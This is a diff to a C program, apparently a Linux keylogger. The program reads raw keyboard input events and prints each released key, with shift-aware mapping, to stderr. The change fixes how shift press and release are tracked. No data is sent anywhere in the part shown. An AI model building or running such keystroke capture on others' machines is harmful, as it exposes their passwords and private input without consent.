@@ -70,24 +70,28 @@ int main(int argc, char *argv[]) {
     while(1) {
         read(fd, &input_ev, sizeof(struct input_event));
 
-
-    if(isShift(input_ev.code)){
-        shift_check = 1;
-        continue;
-    }
-
-    /*input_event.type specifies the input type/method which is key in our case
-        * input_event.value == 0 specifies key_release
-    */
-    if((input_ev.type == EV_KEY) && (input_ev.value == 0)) {
-        if(!shift_check)
-            fprintf(stderr, "%s\n", key_map[input_ev.code][0]);
-        else {
-            fprintf(stderr, "%s\n", key_map[input_ev.code][1]);
-            shift_check = 0;
+        /*Check if key pressed in shift*/
+        if((input_ev.type == EV_KEY) && (input_ev.value == 1)) {    
+            if(isShift(input_ev.code)){
+                shift_check = 1;
+                continue;
+            }
+        } else if((input_ev.type == EV_KEY) && (input_ev.value == 0)) {
+            /*input_event.type specifies the input type/method which is key in our case
+            * input_event.value == 0 specifies key_release
+            */
+            if(isShift(input_ev.code)) {
+                shift_check = 0;
+                continue;
+            }
+            else {
+                if(!shift_check)
+                    fprintf(stderr, "%s\n", key_map[input_ev.code][0]);
+                else
+                    fprintf(stderr, "%s\n", key_map[input_ev.code][1]);
+            }
         }
     }
-}
     close(fd);
     return 0;
 }
